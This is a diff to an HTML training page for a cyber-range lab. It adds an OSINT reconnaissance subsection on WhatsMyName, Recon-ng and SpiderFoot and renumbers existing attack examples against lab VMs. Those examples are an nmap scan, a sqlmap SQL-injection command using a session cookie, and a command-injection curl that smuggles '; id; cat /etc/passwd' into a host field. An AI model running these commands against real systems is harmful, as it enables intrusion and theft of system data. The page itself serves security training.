@@ -394,18 +394,26 @@ dns && udp.port == 5353
 
     <section id="kali" class="section bg-alt">
         <div class="container">
-            <h2 class="section-title">🐉 Penetration Testing with Kali Linux</h2>
+            <h2 class="section-title">🐉 Penetration Testing & OSINT Reconnaissance</h2>
             <div class="guide-box">
                 <h3>A. Port Scanning (Nmap)</h3>
                 <div class="code-block">nmap -p 8080-8085,9000,5353 -sV &lt;UBUNTU_VM_IP&gt;</div>
 
-                <h3>B. SQL Injection (sqlmap) - Banking Lab</h3>
+                <h3>B. OSINT & Reconnaissance Analysis (Recon-ng, SpiderFoot, WhatsMyName)</h3>
+                <p>When conducting Open Source Intelligence (OSINT) testing on microservice cyber ranges:</p>
+                <ul>
+                    <li><strong>WhatsMyName</strong>: Performs username enumeration across 600+ public SaaS platforms (e.g., GitHub, Twitter, Reddit). For local cyber ranges, username targets (`STD-1001`, `admin`) can be analyzed against endpoint lookup APIs (`/api/v1/users/`).</li>
+                    <li><strong>Recon-ng</strong>: Modular OSINT framework querying WHOIS, Shodan, and DNS records. When attacking GNS3/EVE-NG lab subnets, configure Recon-ng modules to query the embedded Mini DNS server (`&lt;UBUNTU_VM_IP&gt;:5353`).</li>
+                    <li><strong>SpiderFoot</strong>: Scrapes web server headers (`Uvicorn/FastAPI`), subdomains, and endpoint URLs across local microservices (`http://&lt;UBUNTU_VM_IP&gt;:8080-8085`) to map software stacks and contact metadata.</li>
+                </ul>
+
+                <h3>C. SQL Injection (sqlmap) - Banking Lab</h3>
                 <div class="code-block">sqlmap -u "http://&lt;UBUNTU_VM_IP&gt;:8081/?q=Allowance" --cookie="session_user=user1" --batch --dbs</div>
 
-                <h3>C. Command Injection - ISP Lab</h3>
+                <h3>D. Command Injection - ISP Lab</h3>
                 <div class="code-block">curl -X POST http://&lt;UBUNTU_VM_IP&gt;:8082/diagnostics -d "host=127.0.0.1; id; cat /etc/passwd"</div>
 
-                <h3>D. Bluetooth Exfiltration - Smartphone Lab</h3>
+                <h3>E. Bluetooth Exfiltration - Smartphone Lab</h3>
                 <div class="code-block">curl -s http://&lt;UBUNTU_VM_IP&gt;:8085/api/v1/bluetooth/exfiltrate</div>
             </div>
         </div>
